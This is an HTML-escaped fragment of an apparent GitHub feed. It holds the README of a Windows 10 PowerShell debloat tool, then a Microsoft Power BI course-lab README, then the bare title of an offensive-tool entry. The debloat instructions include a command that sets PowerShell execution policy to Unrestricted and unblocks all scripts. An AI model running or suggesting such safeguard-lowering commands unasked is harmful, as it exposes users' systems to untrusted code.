Paste this entire line below on &lt;strong&gt;Powershell&lt;/strong&gt;:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ps1&#34;&gt;Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force; ls -Recurse *.ps*1 | Unblock-File; .\&#34;Win10ScriptCLI.ps1&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts&#34;&gt;Scripts&lt;/a&gt; can be run individually, pick what you need.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;✅ GUI Script Features&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Click to expand&lt;/summary&gt; &#xA; &lt;h3&gt;System Tweaks&lt;/h3&gt; &#xA; &lt;h4&gt;System Debloat Tools&lt;/h4&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;code&gt;Apply Tweaks&lt;/code&gt;: Run every Common Tweak scripts;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Undo Tweaks&lt;/code&gt;: Re-apply some tweaks and [Revert] all possible ones, covering the &lt;code&gt;Scheduled Tasks&lt;/code&gt;, &lt;code&gt;Services&lt;/code&gt;, &lt;code&gt;Privacy and Performance&lt;/code&gt;, &lt;code&gt;Personal&lt;/code&gt; and &lt;code&gt;Optional Features&lt;/code&gt; tweaks, then try to &lt;code&gt;Reinstall Pre-Installed Apps&lt;/code&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Remove Xbox&lt;/code&gt;: Wipe Xbox Apps, disable Services related to Xbox and GameBar/GameDVR; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/remove-xbox.ps1&#34;&gt;&lt;code&gt;remove-xbox.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Install OneDrive&lt;/code&gt;: Tries to re-install the built-in OneDrive; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/install-onedrive.ps1&#34;&gt;&lt;code&gt;install-onedrive.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Reinstall Pre-Installed Apps&lt;/code&gt;: Rebloat Windows with all the Pre-Installed Apps; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/reinstall-pre-installed-apps.ps1&#34;&gt;&lt;code&gt;reinstall-pre-installed-apps.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Repair Windows&lt;/code&gt;: Try to Completely fix the Windows worst problems via Command Line; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/backup-system.ps1&#34;&gt;&lt;code&gt;backup-system.ps1&lt;/code&gt;&lt;/a&gt; and &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/repair-windows.ps1&#34;&gt;&lt;code&gt;repair-windows.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Show Debloat Info&lt;/code&gt;: Make an overall check-up from disabled and enabled Windows Components (Compare before and after applying tweaks, it&#39;s a great difference); (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/show-debloat-info.ps1&#34;&gt;&lt;code&gt;show-debloat-info.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;h4&gt;Customize System Features&lt;/h4&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;code&gt;Dark Theme &amp;amp; Light Theme&lt;/code&gt;: Apply &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/use-dark-theme.reg&#34;&gt;Dark Theme&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/use-light-theme.reg&#34;&gt;Light Theme&lt;/a&gt; on Windows;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Enable/Disable Activity History&lt;/code&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/enable-activity-history.reg&#34;&gt;Enables&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/disable-activity-history.reg&#34;&gt;Disables&lt;/a&gt; the &lt;strong&gt;Activity History&lt;/strong&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Enable/Disable Background Apps&lt;/code&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/enable-bg-apps.reg&#34;&gt;Enables&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/disable-bg-apps.reg&#34;&gt;Disables&lt;/a&gt; &lt;em&gt;ALL&lt;/em&gt; the &lt;strong&gt;Background Apps&lt;/strong&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Enable/Disable Cortana&lt;/code&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/enable-cortana.reg&#34;&gt;Enables&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/disable-cortana.reg&#34;&gt;Disables&lt;/a&gt; the &lt;strong&gt;Cortana&lt;/strong&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Enable/Disable Clipboard History&lt;/code&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/enable-clipboard-history.reg&#34;&gt;Enables&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/disable-clipboard-history.reg&#34;&gt;Disables&lt;/a&gt; the &lt;strong&gt;Clipboard History&lt;/strong&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Enable/Disable Old Volume Control&lt;/code&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/enable-old-volume-control.reg&#34;&gt;Enables&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/disable-old-volume-control.reg&#34;&gt;Disables&lt;/a&gt; the &lt;strong&gt;Old Volume Control (Win 7/8.1)&lt;/strong&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Enable/Disable Photo Viewer&lt;/code&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/enable-photo-viewer.reg&#34;&gt;Enables&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/disable-photo-viewer.reg&#34;&gt;Disables&lt;/a&gt; the &lt;strong&gt;Photo Viewer (Win 7/8.1)&lt;/strong&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Enable/Disable Search Indexing&lt;/code&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/enable-search-idx.ps1&#34;&gt;Enables&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/disable-search-idx.ps1&#34;&gt;Disables&lt;/a&gt; the &lt;strong&gt;Windows Search Service&lt;/strong&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Enable/Disable Telemetry&lt;/code&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/enable-telemetry.reg&#34;&gt;Enables&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/disable-telemetry.reg&#34;&gt;Disables&lt;/a&gt; the &lt;strong&gt;Windows Telemetry&lt;/strong&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Enable/Disable Xbox GameBar/DVR&lt;/code&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/enable-game-bar-dvr.reg&#34;&gt;Enables&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/disable-game-bar-dvr.reg&#34;&gt;Disables&lt;/a&gt; the &lt;strong&gt;Xbox GameBar/DVR (In-Game)&lt;/strong&gt;;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;h4&gt;Miscellaneous Features&lt;/h4&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;code&gt;Enable/Disable God Mode&lt;/code&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/enable-god-mode.ps1&#34;&gt;Enables&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/disable-god-mode.ps1&#34;&gt;Disables&lt;/a&gt; the hidden Desktop folder &lt;strong&gt;God Mode&lt;/strong&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Enable/Disable Take Ownership menu&lt;/code&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/enable-take-ownership-context-menu.reg&#34;&gt;Enables&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/disable-take-ownership-context-menu.reg&#34;&gt;Disables&lt;/a&gt; the &lt;strong&gt;Take Ownership context menu&lt;/strong&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Enable/Disable Shutdown PC shortcut&lt;/code&gt;: &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/enable-shutdown-pc-shortcut.ps1&#34;&gt;Enables&lt;/a&gt; or &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/utils/disable-shutdown-pc-shortcut.ps1&#34;&gt;Disables&lt;/a&gt; the &lt;strong&gt;Shutdown Computer desktop shortcut&lt;/strong&gt;;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;h3&gt;Software Install&lt;/h3&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;code&gt;Install Selected&lt;/code&gt;: Install the selected apps by marking the checkbox(es);&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;Uninstall Mode&lt;/code&gt;: Default as OFF, clicking this will switch the &lt;code&gt;Install Selected&lt;/code&gt; button to &lt;code&gt;Uninstall Selected&lt;/code&gt; and uninstall every selected apps (&lt;strong&gt;Advice&lt;/strong&gt;: Blue colored buttons may not be able to uninstall completely and WSL UWP Apps, but WSL Distros will be unregistered);&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;h2&gt;☑️ Common Script Features&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Click to expand&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;Import all necessary Modules before Executing everything; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/lib/&#34;&gt;lib folder&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;Logs both script versions on &lt;code&gt;C:\Users\Username\AppData\Local\Temp\Win10-SDT-Logs&lt;/code&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;Make a Restore Point and Backup the Hosts file; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/backup-system.ps1&#34;&gt;&lt;code&gt;backup-system.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;Install &lt;em&gt;Chocolatey/Winget&lt;/em&gt; by default; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/install-package-managers.ps1&#34;&gt;&lt;code&gt;install-package-managers.ps1&lt;/code&gt;&lt;/a&gt;) &#xA;   &lt;ul&gt; &#xA;    &lt;li&gt;Auto-Update every available software via &lt;code&gt;Winget&lt;/code&gt; (12:00/day) and &lt;code&gt;Chocolatey&lt;/code&gt; (13:00/day);&lt;/li&gt; &#xA;    &lt;li&gt;Find the Scheduled Job on &lt;code&gt;Task Scheduler &amp;gt; &#34;Microsoft\Windows\PowerShell\ScheduledJobs\Chocolatey/Winget Daily Upgrade&#34;&lt;/code&gt;;&lt;/li&gt; &#xA;    &lt;li&gt;Register daily upgrade logs on &lt;code&gt;C:\Users\Username\AppData\Local\Temp\Win10-SDT-Logs&lt;/code&gt; and remove old log files;&lt;/li&gt; &#xA;   &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;li&gt;Download AdwCleaner and Run the latest version of for Virus/Adware scan; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/silent-debloat-softwares.ps1&#34;&gt;&lt;code&gt;silent-debloat-softwares.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;Download OOShutUp10 and import all Recommended settings;&lt;/li&gt; &#xA;  &lt;li&gt;Disable Telemetry from Scheduled Tasks and Optimize it; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/optimize-task-scheduler.ps1&#34;&gt;&lt;code&gt;optimize-task-scheduler.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;Disable heavy Services, but enable some on SSDs for optimum performance; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/optimize-services.ps1&#34;&gt;&lt;code&gt;optimize-services.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;Remove Bloatware UWP Apps that comes with Windows 10+, except from my choice; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/remove-bloatware-apps.ps1&#34;&gt;&lt;code&gt;remove-bloatware-apps.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;Optimize Privacy by disabling more telemetry stuff and changing GPOs; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/optimize-privacy.ps1&#34;&gt;&lt;code&gt;optimize-privacy.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;Optimize Performance by changing away from stock configurations that slowdowns the system; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/optimize-performance.ps1&#34;&gt;&lt;code&gt;optimize-performance.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;Apply General Personalization tweaks via Registry and Powershell commands; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/personal-tweaks.ps1&#34;&gt;&lt;code&gt;personal-tweaks.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;Help improve the Security of Windows while maintaining performance; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/optimize-security.ps1&#34;&gt;&lt;code&gt;optimize-security.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;Remove OneDrive completely from the System, re-install is possible via Win Store; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/remove-onedrive.ps1&#34;&gt;&lt;code&gt;remove-onedrive.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;Disable/Enable Windows Features specially for Gaming/Productivity; (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/scripts/optimize-windows-features.ps1&#34;&gt;&lt;code&gt;optimize-windows-features.ps1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;li&gt;In the End it only locks Local Machine script execution. (&lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/src/lib/set-script-policy.psm1&#34;&gt;&lt;code&gt;set-script-policy.psm1&lt;/code&gt;&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;h2&gt;⚡ Troubleshooting Known Issues&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;For each issue, expand the issue you&#39;re looking for, and Open PowerShell as admin to copy + paste it&#39;s content:&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Bring back Taskbar &lt;code&gt;Widgets&lt;/code&gt; (Windows 11) - See &lt;a href=&#34;https://github.com/LeDragoX/Win-10-Smart-Debloat-Tools/issues/7&#34;&gt;#7&lt;/a&gt;&lt;/summary&gt; &#xA; &lt;ol&gt; &#xA;  &lt;li&gt;Press &lt;code&gt;Win + R&lt;/code&gt; then paste this protocol: &lt;code&gt;ms-windows-store://pdp/?ProductId=9MSSGKG348SP&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;Then click &lt;code&gt;Get&lt;/code&gt;/&lt;code&gt;Install&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;After this, open the &lt;code&gt;Taskbar Settings&lt;/code&gt; and enable the &lt;code&gt;Widgets&lt;/code&gt; button again&lt;/li&gt; &#xA; &lt;/ol&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Fix &lt;code&gt;NVIDIA Control Panel&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;blockquote&gt; &#xA;  &lt;p&gt;Only this time (Recommended - Consumes less RAM after boot)&lt;/p&gt; &#xA; &lt;/blockquote&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-Powershell&#34;&gt;Get-Service &#34;NVDisplay.ContainerLocalSystem&#34; | Set-Service -StartupType Manual -PassThru | Start-Service&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;blockquote&gt; &#xA;  &lt;p&gt;Permanently (Keeps the service running along with the system)&lt;/p&gt; &#xA; &lt;/blockquote&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-Powershell&#34;&gt;Get-Service &#34;NVDisplay.ContainerLocalSystem&#34; | Set-Service -StartupType Automatic -PassThru | Start-Service&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Sysprep will hang (Not Tested).&lt;/summary&gt; &#xA; &lt;blockquote&gt; &#xA;  &lt;p&gt;&lt;em&gt;No solution yet, do a Google search&lt;/em&gt;&lt;/p&gt; &#xA; &lt;/blockquote&gt; &#xA;&lt;/details&gt; &#xA;&lt;h2&gt;🏅 More Debloat Scripts (Community)&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Click to expand&lt;/summary&gt; &#xA; &lt;p&gt;The scripts are designed to run With/Without (GUI/CLI) any user interaction. Modify them beforehand. If you want a more interactive approach check out:&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/ChrisTitusTech/win10script&#34;&gt;win10script&lt;/a&gt; and &lt;a href=&#34;https://github.com/ChrisTitusTech/winutil&#34;&gt;winutil&lt;/a&gt; (Recommended) from &lt;a href=&#34;https://github.com/ChrisTitusTech&#34;&gt;ChrisTitusTech&lt;/a&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/Sycnex/Windows10Debloater&#34;&gt;Windows10Debloater&lt;/a&gt; from &lt;a href=&#34;https://github.com/Sycnex&#34;&gt;Sycnex&lt;/a&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/farag2/Sophia-Script-for-Windows&#34;&gt;Sophia-Script-for-Windows&lt;/a&gt; from &lt;a href=&#34;https://github.com/farag2&#34;&gt;farag2&lt;/a&gt;;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/simeononsecurity/Windows-Optimize-Harden-Debloat&#34;&gt;Windows-Optimize-Harden-Debloat&lt;/a&gt; and &lt;a href=&#34;https://github.com/simeononsecurity/Windows-Optimize-Debloat&#34;&gt;Windows-Optimize-Debloat&lt;/a&gt; from &lt;a href=&#34;https://github.com/simeononsecurity&#34;&gt;SimeonOnSecurity&lt;/a&gt;;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;h2&gt;🔧 Tweak Testers&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;All of &lt;em&gt;my friends and people&lt;/em&gt; who trusted on me to run the script;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/yCr-shiddy&#34;&gt;yCr-shiddy&lt;/a&gt; - Helped giving more ideas and fixes;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;🤍 Credits&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Special thanks to the &lt;a href=&#34;https://youtu.be/IU5F01oOzQQ?t=324&#34;&gt;LowSpecGamer&lt;/a&gt;, he is the reason i&#39;ve adapted this script.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/W4RH4WK&#34;&gt;W4RH4WK&lt;/a&gt; (For his project ^^);&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;📚 Used code references&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCjidjWX76LR1g5yx18NSrLA&#34;&gt;Adamx&#39;s&lt;/a&gt; - by &lt;a href=&#34;https://youtu.be/hQSkPmZRCjc&#34;&gt;&lt;em&gt;this video&lt;/em&gt;&lt;/a&gt; (and script);&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/user/baboo&#34;&gt;Baboo&#39;s&lt;/a&gt; - by &lt;a href=&#34;https://youtu.be/qWESrvP_uU8&#34;&gt;&lt;em&gt;this video&lt;/em&gt;&lt;/a&gt; (and commands);&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCg6gPGh8HU2U01vaFCAsvmQ&#34;&gt;ChrisTitusTech&lt;/a&gt; - by having taught how to mess with PowerShell in &lt;a href=&#34;https://youtu.be/ER27pGt5wH0&#34;&gt;this Stream&lt;/a&gt; (and his &lt;em&gt;open-source&lt;/em&gt; debloat script);&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCnG-TN23lswO6QbvWhMtxpA&#34;&gt;Daniel Persson&lt;/a&gt; - by &lt;a href=&#34;https://youtu.be/EfrT_Bvgles&#34;&gt;&lt;em&gt;this video&lt;/em&gt;&lt;/a&gt; (and script explanation);&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/matthewjberger&#34;&gt;matthewjberger&lt;/a&gt; - by &lt;a href=&#34;https://gist.github.com/matthewjberger/2f4295887d6cb5738fa34e597f457b7f&#34;&gt;&lt;em&gt;this script&lt;/em&gt;&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;📝 License&lt;/h2&gt; &#xA;&lt;p&gt;Licensed under the &lt;a href=&#34;https://raw.githubusercontent.com/LeDragoX/Win-10-Smart-Debloat-Tools/main/LICENSE.txt&#34;&gt;MIT&lt;/a&gt; license.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;MalwareBytes AdwCleaner&lt;/strong&gt; and &lt;strong&gt;O&amp;amp;O ShutUp10++&lt;/strong&gt; have their own licenses.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>MicrosoftLearning/PL-300-Microsoft-Power-BI-Data-Analyst</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/MicrosoftLearning/PL-300-Microsoft-Power-BI-Data-Analyst</id>
    <link href="https://github.com/MicrosoftLearning/PL-300-Microsoft-Power-BI-Data-Analyst" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PL-300: Microsoft Power BI Data Analyst&lt;/h1&gt; &#xA;&lt;p&gt;This repository contains the hands-on lab exercises for Microsoft course &lt;a href=&#34;https://docs.microsoft.com/en-us/learn/certifications/courses/PL-300T00&#34;&gt;PL-300: Microsoft Power BI Data Analyst&lt;/a&gt;. The labs are designed to accompany the learning materials and enable learners to practice using the technologies they describe.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Are you a MCT?&lt;/strong&gt; - Have a look at our &lt;a href=&#34;https://microsoftlearning.github.io/MCT-User-Guide/&#34;&gt;GitHub User Guide for MCTs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Need to manually build the lab instructions?&lt;/strong&gt; - Instructions are available in the &lt;a href=&#34;https://github.com/MicrosoftLearning/Docker-Build&#34;&gt;MicrosoftLearning/Docker-Build&lt;/a&gt; repository&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Do you need a refresher on which labs go with which module?&lt;/strong&gt; - Check out the &lt;a href=&#34;https://microsoftlearning.github.io/PL-300-Microsoft-Power-BI-Data-Analyst/&#34;&gt;GitHub Page&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What are we doing?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;To support this course, we will need to make frequent updates to the course content to keep it current with the Power BI services used in the course. We are publishing the lab instructions and lab files on GitHub to allow for open contributions between the course authors and MCTs to keep the content current with changes in the Power BI platform.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;We hope that this brings a sense of collaboration to the labs like we&#39;ve never had before - when Power BI changes and you find it first during a live delivery, go ahead and make an enhancement right in the lab source. Help your fellow MCTs.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How should I use these files relative to the released MOC files?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The instructor handbook and PowerPoints are still going to be your primary source for teaching the course content.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;These files on GitHub are designed to be used in conjunction with the student handbook, but are in GitHub as a central repository so MCTs and course authors can have a shared source for the latest lab files.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;It will be recommended that for every delivery, trainers check GitHub for any changes that may have been made to support the latest Azure services, and get the latest files for their delivery.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What about changes to the student handbook?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;We will review the student handbook on a quarterly basis and update through the normal MOC release channels as needed.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How do I contribute?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Any MCT can submit a pull request to the code or content in the GitHub repro, Microsoft and the course author will triage and include content and lab code changes as needed.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;You can submit bugs, changes, improvement and ideas. Find a new Power BI feature before we have? Submit a new demo!&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Notes&lt;/h2&gt; &#xA;&lt;h3&gt;Classroom Materials&lt;/h3&gt; &#xA;&lt;p&gt;It is strongly recommended that MCTs and Partners access these materials and in turn, provide them separately to students. Pointing students directly to GitHub to access Lab steps as part of an ongoing class will require them to access yet another UI as part of the course, contributing to a confusing experience for the student. An explanation to the student regarding why they are receiving separate Lab instructions can highlight the nature of an always-changing cloud-based interface and platform. Microsoft Learning support for accessing files on GitHub and support for navigation of the GitHub site is limited to MCTs teaching this course only.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>S3cur3Th1sSh1t/WinPwn</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/S3cur3Th1sSh1t/WinPwn</id>
    <link href="https://github.com/S3cur3Th1sSh1t/WinPwn" rel="alternate"></link>
